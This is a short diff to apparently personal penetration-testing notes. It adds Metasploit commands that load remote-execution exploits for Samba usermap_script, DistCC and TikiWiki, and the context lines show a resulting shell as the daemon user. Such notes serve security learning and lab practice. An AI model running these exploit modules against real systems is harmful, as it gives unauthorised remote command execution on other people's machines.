@@ -245,6 +245,7 @@ Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)
 1-Samba
 
 
+msf > use exploit/multi/samba/usermap_script 
 
 msf exploit(usermap_script) > show options
 
@@ -311,7 +312,7 @@ DistCC Daemon - Command Execution (Metasploit) (2)                              
 
 
 
-
+msf > use exploit/unix/misc/distcc_exec 
 
 msf exploit(distcc_exec) > show options
 
@@ -364,6 +365,8 @@ uid=1(daemon) gid=1(daemon) groups=1(daemon)
 
 
 #tikiwiki 
+
+msf > use exploit/unix/webapp/tikiwiki_graph_formula_exec 
 
 exploit/unix/webapp/tikiwiki_graph_formula_exec
 
